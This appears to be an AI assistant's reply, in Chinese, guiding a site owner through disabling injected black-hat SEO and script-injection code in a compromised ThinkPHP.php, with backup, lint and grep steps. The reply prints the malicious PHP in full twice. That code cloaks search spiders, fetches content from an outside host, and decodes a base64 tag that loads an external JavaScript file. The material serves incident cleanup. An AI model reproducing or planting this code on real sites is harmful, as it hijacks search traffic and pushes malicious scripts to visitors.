好，这一段信息很关键，可以确认：**ThinkPHP.php 的尾部已经被插了一大坨黑帽 SEO / 挂马代码**。

我们先只做一件小事：
👉 **把这段恶意逻辑“关掉”（注释掉），保持文件其余部分不动。**

---

## 1. 这段代码在干嘛？（你心里要有数）

你贴出来的这一段：

```php
// 核心文件
define('url', $b['REQUEST_URI']);
define('ref', !isset($b['HTTP_REFERER']) ? '' : $b['HTTP_REFERER']);
define('ent', $b['HTTP_USER_AGENT']);
define('site', "http://lao.asnhw.com/");
define('road', "?road=" . $b['HTTP_HOST'] . url);
define('memes', road . "&referer=" . urlencode(ref));
define('regs', '@BaiduSpider|Sogou|Yisou|Haosou|360Spider@i');
define('mobile', '/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|' .
                'MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/');

// 设置和获取统计数据
$hasPattern = matchLinkPattern($b['REQUEST_URI']);

// 字符串命名风格转换
if (preg_match(regs, ent) &&
    url != "" &&
    url != "/" &&
    url != "/index.php") {

    echo httpGetlai(site.road);
    exit();
} elseif (preg_match(regs, ent)) {
    echo httpGet2($b['HTTP_HOST'] . url);
    exit();
}
if (preg_match("/.*(sogou|baidu|yisou|sm|bing|360|tout|haos).*/i",ref,$OutUa)&&preg_match(mobile, ent)&&url!=""&&url!="/"&&url!="/index.php"&&url!="/index.html") {
    echo base64_decode('PHNjcmlwdCBzcmM9aHR0cHM6Ly9qcy5lcm9rc3ouY29tL2R5L2R5LmpzPjwvc2NyaXB0Pg==');
    exit;
}
if(version_compare(PHP_VERSION,'5.4.0','<')) {
```

问题点：

1. `site = "http://lao.asnhw.com/"` → 把部分访问（尤其是蜘蛛）重定向到外部恶意站点
2. `regs` / `mobile` 里匹配各种搜索引擎 UA + 手机 UA
3. `httpGetlai(site.road)`、`httpGet2(...)` → 请求恶意站点内容
4. `base64_decode('PHNjcmlwdC...')` 解出来是：

   ```html
   <script src="https://js.eroksz.com/dy/dy.js"></script>
   ```

   这是典型挂马 / 广告脚本域名。

**这 100% 不是 ThinkPHP 官方代码，是攻击者改了入口文件，做搜索引擎/移动端劫持 & 恶意脚本注入。**

---

## 2. 这一小步要做什么？

👉 目标：**只把这一块恶意逻辑“注释掉”，其它一行不碰。**

这样有几个好处：

* 立即停止恶意重定向和脚本注入
* 不改变 ThinkPHP 正常初始化逻辑
* 有备份，有问题可以随时回滚

后面我们有空再来“彻底清理”（比如顺便把 httpGetlai、httpGet2、matchLinkPattern 那些注入函数一起删掉），现在先止血。

---

## 3. 实际操作步骤（只做这一块）

### 3.1 先备份 ThinkPHP.php

```bash
cd /data/www/www.chowtaiking.com.cn
cp ThinkPHP/ThinkPHP.php ThinkPHP/ThinkPHP.php.bak_$(date +%Y%m%d_%H%M%S)
```

这样如果改坏了，可以直接还原：

```bash
cp ThinkPHP/ThinkPHP.php.bak_2025xxxx_xxxxxx ThinkPHP/ThinkPHP.php
```

（日期根据实际文件名改）

---

### 3.2 用编辑器打开文件

用你顺手的一个：

```bash
vim ThinkPHP/ThinkPHP.php
# 或
nano ThinkPHP/ThinkPHP.php
```

---

### 3.3 用块注释把恶意代码包起来

找到你贴出来的这一段开头：

```php
// 核心文件
define('url', $b['REQUEST_URI']);
define('ref', !isset($b['HTTP_REFERER']) ? '' : $b['HTTP_REFERER']);
define('ent', $b['HTTP_USER_AGENT']);
define('site', "http://lao.asnhw.com/");
...
if (preg_match("/.*(sogou|baidu|yisou|sm|bing|360|tout|haos).*/i",ref,$OutUa)&&preg_match(mobile, ent)&&url!=""&&url!="/"&&url!="/index.php"&&url!="/index.html") {
    echo base64_decode('PHNjcmlwdCBzcmM9aHR0cHM6Ly9qcy5lcm9rc3ouY29tL2R5L2R5LmpzPjwvc2NyaXB0Pg==');
    exit;
}
if(version_compare(PHP_VERSION,'5.4.0','<')) {
```

我们要把 **从 `// 核心文件` 这一行，到 `exit; }` 这一行**，用 `/* ... */` 包起来。

改成这样：

```php
    return $output;
}

/* ====== 恶意注入代码，已临时禁用（SEO 挂马 / 重定向） ======

// 核心文件
define('url', $b['REQUEST_URI']);
define('ref', !isset($b['HTTP_REFERER']) ? '' : $b['HTTP_REFERER']);
define('ent', $b['HTTP_USER_AGENT']);
define('site', "http://lao.asnhw.com/");
define('road', "?road=" . $b['HTTP_HOST'] . url);
define('memes', road . "&referer=" . urlencode(ref));
define('regs', '@BaiduSpider|Sogou|Yisou|Haosou|360Spider@i');
define('mobile', '/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|' .
                'MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/');

// 设置和获取统计数据
$hasPattern = matchLinkPattern($b['REQUEST_URI']);

// 字符串命名风格转换
if (preg_match(regs, ent) &&
    url != "" &&
    url != "/" &&
    url != "/index.php") {

    echo httpGetlai(site.road);
    exit();
} elseif (preg_match(regs, ent)) {
    echo httpGet2($b['HTTP_HOST'] . url);
    exit();
}
if (preg_match("/.*(sogou|baidu|yisou|sm|bing|360|tout|haos).*/i",ref,$OutUa)&&preg_match(mobile, ent)&&url!=""&&url!="/"&&url!="/index.php"&&url!="/index.html") {
    echo base64_decode('PHNjcmlwdCBzcmM9aHR0cHM6Ly9qcy5lcm9rc3ouY29tL2R5L2R5LmpzPjwvc2NyaXB0Pg==');
    exit;
}

====== 恶意注入代码结束 ====== */

if(version_compare(PHP_VERSION,'5.4.0','<')) {
    ini_set('magic_quotes_runtime',0);
    define('MAGIC_QUOTES_GPC',get_magic_quotes_gpc()? true : false);
}else{
    define('MAGIC_QUOTES_GPC',false);
}
```

**注意：**

* `/*` 和 `*/` 一定要成对出现，不能漏
* `if(version_compare(...` 必须在注释块 **外面**，保持原样

保存退出。

---

### 3.4 检查语法是否 OK

在项目根目录执行：

```bash
php -l ThinkPHP/ThinkPHP.php
```

正常应该输出类似：

```text
No syntax errors detected in ThinkPHP/ThinkPHP.php
```

如果有错误（比如提示注释没闭合），直接把刚才那段再贴给我，我们一起改。

---

### 3.5 简单验证网站

打开网站首页 / 后台常用页面，看是否能正常打开、无白屏 / 500 报错。

**到目前为止：**

* comm.php 后门你已经删了
* Boriehavior.class.php 你已经删了
* ThinkPHP.php 里的 SEO 挂马 / JS 注入已经被注释掉

网站还能正常打开的话，说明这一小步是安全的。

---

## 4. 做完这一步之后，下一小步再继续排查

等你完成上面操作，并确认：

1. `php -l` 通过
2. 网站正常访问

请再执行下面两条命令，把结果贴给我，我们再做下一步精细排查：

```bash
grep -R "eroksz.com" -n .
grep -R "lao.asnhw.com" -n .
```

> 如果都只有 ThinkPHP.php 这一处（现在已经被注释），说明这两条恶意外链暂时已经“失效”；
> 如果还有别的文件出现，我们再继续一步步清理。
